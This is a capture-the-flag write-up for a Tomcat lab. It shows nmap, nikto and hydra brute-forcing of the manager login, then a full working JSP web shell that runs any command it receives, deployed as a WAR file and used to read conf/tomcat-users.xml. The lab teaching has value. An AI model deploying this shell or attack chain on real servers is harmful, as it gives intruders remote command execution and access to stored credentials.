# **War of Tomcat** Write Up

**Apache Tomcat** is a open-source web server, provides platform for running Java-based web applications and supports several Java technologies.

**War** (Web Application Archives) is a package format used to distribute a web application. It contains all the components needed to run a web application, such as HTML files, JavaServer Pages (JSPs), servlets, Java classes, libraries (JAR files), and configuration files.

**Tomcat uses WAR** files to deploy web applications. When you deploy a WAR file to Tomcat, it extracts the contents and sets up the web application on the server.

## Web First Look:

![image-20240912003139430](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240912003139430.png)

Tomcat has a management interface that is usually available at :

```
http://10.214.160.13:10007/manager/html
```

![image-20240912003412965](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240912003412965.png)

After curling the html I found this:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
   <p>
    Note that for Tomcat 7 onwards, the roles required to use the manager
    application were changed from the single <tt>manager</tt> role to the
    following four roles. You will need to assign the role(s) required for
    the functionality you wish to access.
   </p>
    <ul>
      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
          pages</li>
      <li><tt>manager-script</tt> - allows access to the text interface and the
          status pages</li>
      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
          pages</li>
      <li><tt>manager-status</tt> - allows access to the status pages only</li>
    </ul>
   <p>
    The HTML interface is protected against CSRF but the text and JMX interfaces
    are not. To maintain the CSRF protection:
   </p>
   <ul>
    <li>Users with the <tt>manager-gui</tt> role should not be granted either
        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
        testing since these interfaces are intended for tools not humans) then
        the browser must be closed afterwards to terminate the session.</li>
   </ul>
   <p>
    For more information - please see the
    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
   </p>
 </body>

</html>
```

after attempting to put the username and password **tomcat:s3cret** it is not working, perhaps the problem is because the password might got changed recently.

So the next step was by using the nmap to check the port:

```bash
nmap -sV -p 10007 --script=http-server-header,http-title 10.214.160.13
```

![55](C:\Users\ASUS\Desktop\Write Ups\images\55.png)

here, it just confirms us that the website is using ***Apache Tomcat / Coyote JSP engine 1.1***

After running nikto:

```bash
nikto -h http://10.214.160.13:10007
```

![image-20240913202459988](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913202459988.png)

After running hydra to brute force the tomcat:

```bash
hydra -L tomcat-users.txt -P tomcat-password.txt http-get://10.214.160.13:10007/manager/html
```



![image-20240913212426775](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913212426775.png)

turns out it is ***tomcat:tomcat***

![image-20240913212538442](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913212538442.png)

and now we are inside the Tomcat Web Application Manager:

now lets create a **WAR(Web Application Archive)** and deploy it to the server,

First I create the **.jsp** file: (.jsp is a java file to be embed to html page to create dynamic content or display)

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

This code is intended to inject a Web Shell Code, but first we need to convert it to a **WAR** file using the jar command,

![image-20240913220241060](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913220241060.png)

We now have the **webshell.war** file, next we uploaded in the web application manager

![image-20240913220347886](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913220347886.png)

After uploading, let's directly access the url 

```
http://10.214.160.13:10007/webshell/
```

then we can access the webshell we just injected

by applying the command 

```
cat conf/tomcat-users.xml
```

we can access where the flag is hidden:

![image-20240913220547121](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240913220547121.png)

After further inspection I found the flag inside the inspect source tab hidden in the role tag

Flag : **AAA{t0mcat_wiTh_manager_1s_dangerous_qq_GROUP_~~}  ~~ is hidden for privacy purpose**
